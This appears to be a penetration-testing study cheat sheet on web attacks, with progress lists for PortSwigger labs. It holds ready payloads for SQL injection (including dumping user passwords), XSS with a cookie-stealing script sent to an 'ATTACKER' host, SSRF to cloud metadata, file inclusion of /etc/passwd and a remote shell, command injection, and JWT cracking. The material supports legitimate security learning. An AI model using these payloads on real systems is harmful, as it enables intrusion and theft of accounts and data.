# 03 — Web Application Attacks

## OWASP Top 10 (2021)

| # | Vulnerability |
|---|--------------|
| A01 | Broken Access Control |
| A02 | Cryptographic Failures |
| A03 | Injection |
| A04 | Insecure Design |
| A05 | Security Misconfiguration |
| A06 | Vulnerable & Outdated Components |
| A07 | Identification & Authentication Failures |
| A08 | Software & Data Integrity Failures |
| A09 | Security Logging & Monitoring Failures |
| A10 | Server-Side Request Forgery (SSRF) |

---

## SQL Injection

### Detection
```
'
''
`
')
"))
' OR '1'='1
' OR 1=1--
```

### Union-Based
```sql
' ORDER BY 3--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password,NULL FROM users--
```

### Blind (Boolean)
```sql
' AND 1=1--   (true)
' AND 1=2--   (false)
' AND SUBSTRING(username,1,1)='a'--
```

### Tools
```bash
sqlmap -u "https://target/page?id=1" --dbs
sqlmap -u "https://target/page?id=1" -D dbname --tables
sqlmap -u "https://target/page?id=1" -D dbname -T users --dump
```

### PortSwigger Labs Progress
- [ ] SQL injection UNION attack, determining number of columns
- [ ] SQL injection UNION attack, retrieving data
- [ ] Blind SQL injection with conditional responses
- [ ] Blind SQL injection with time delays

---

## Cross-Site Scripting (XSS)

### Types
- **Reflected** — payload in URL, reflected in response
- **Stored** — payload saved in DB, served to all users
- **DOM-based** — client-side JS processes attacker data

### Payloads
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'-alert(1)-'
\'-alert(1)//
```

### Cookie Stealing
```html
<script>document.location='http://ATTACKER/steal?c='+document.cookie</script>
```

### PortSwigger Labs Progress
- [ ] Reflected XSS into HTML context
- [ ] Stored XSS into HTML context
- [ ] DOM XSS in document.write sink
- [ ] XSS into attribute with angle brackets HTML-encoded

---

## IDOR / Broken Access Control

```
GET /api/user/1001/profile
→ Change to: GET /api/user/1002/profile

POST /deleteAccount
{"userId": "1001"}
→ Change to: {"userId": "1002"}
```

### What to test
- Sequential IDs in URLs
- GUIDs/UUIDs — are they in JS or responses?
- Account functions: edit profile, delete, export data
- Admin endpoints: `/admin`, `/dashboard`, `/manage`
- HTTP method tampering: GET → POST, DELETE, PUT

---

## SSRF

```
# Basic
url=http://127.0.0.1/
url=http://localhost/admin
url=http://169.254.169.254/latest/meta-data/

# Bypasses
url=http://127.1/
url=http://0x7f000001/
url=http://[::1]/
url=http://spoofed-domain.com → resolves to 127.0.0.1
```

---

## File Inclusion

```
# LFI
?file=../../../../etc/passwd
?file=....//....//etc/passwd
?file=php://filter/convert.base64-encode/resource=index.php

# RFI (if allow_url_include = On)
?file=http://ATTACKER/shell.txt
```

---

## Command Injection

```
; id
| id
&& id
`id`
$(id)
%0aid     (newline)
```

---

## JWT Attacks

```bash
# Decode
echo "BASE64_PAYLOAD" | base64 -d

# None algorithm — remove signature, set alg:none

# Weak secret crack
hashcat -a 0 -m 16500 token.txt rockyou.txt

# RS256 → HS256 confusion
# Sign with public key as HMAC secret
```

---

## Tools

```bash
burpsuite                          # proxy, scanner, repeater
ffuf -u https://target/FUZZ -w wordlist.txt
gobuster dir -u https://target -w wordlist.txt
nikto -h https://target
wfuzz -c -z file,wordlist.txt --hc 404 https://target/FUZZ
```
